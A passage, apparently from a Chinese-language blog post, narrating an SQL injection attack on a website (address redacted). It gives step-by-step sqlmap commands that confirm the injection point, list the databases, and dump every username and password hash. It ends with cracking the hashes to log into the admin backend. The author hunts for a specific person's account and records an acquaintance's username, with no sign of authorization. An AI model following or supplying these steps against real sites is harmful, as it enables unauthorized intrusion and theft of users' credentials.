**2\. 工具验证注射点：**

  

![](../Images/78cf7a9aae403a9375c5f3358e108b91.png)

  

用了同事教我的sqlmap来验证注射点，果然很好用

  

Sqlmap验证：

```

Sqlmap.py
–u “http://www.xxx.com/xxx.php?cid=118” –p cpid
```

  

3\. 然后得到数据库名：cn397073：

  

![](../Images/90929dafe3691225bac4311d4340a862.png)

  

Sqlmap注射出数据库名:

  

```
Sqlmap.py
–u “http://www.xxx.com/xxx.php?cid=118” –p cpid --dbs
```

**4\. 然后注射出所有用户名：**

  

![](../Images/342219d942001d187f81d8c7ca9d7e95.png)

  

有点小激动，但是找了下没找到跟他相关的用户名，难道不上了？不过看到了最后一个是熟人的名称缩写，虽然没什么用，但好奇也记下了。

  

Sqlmap注射出库内所有用户名（表名不常见，用了其他办法找到的，不表）：

  

```
Sqlmap.py
–u “http://www.xxx.com/xxx.php?cid=118” –p cpid –D cn397073 –T xxx –C
username --dump
```

**5\. 不管有没有用 都到这步了，先注射出密码进去看看：**

  

![](../Images/98312c446ed236a1297a0b2b03b4f138.png)

  

Sqlmap注射出库内所有密码hash：

```

Sqlmap.py
–u “http://www.xxx.com/xxx.php?cid=118” –p cpid –D cn397073 –T xxx –C
password --dump
```

**6\. 对密码hash解密后得到明文，登陆后台**
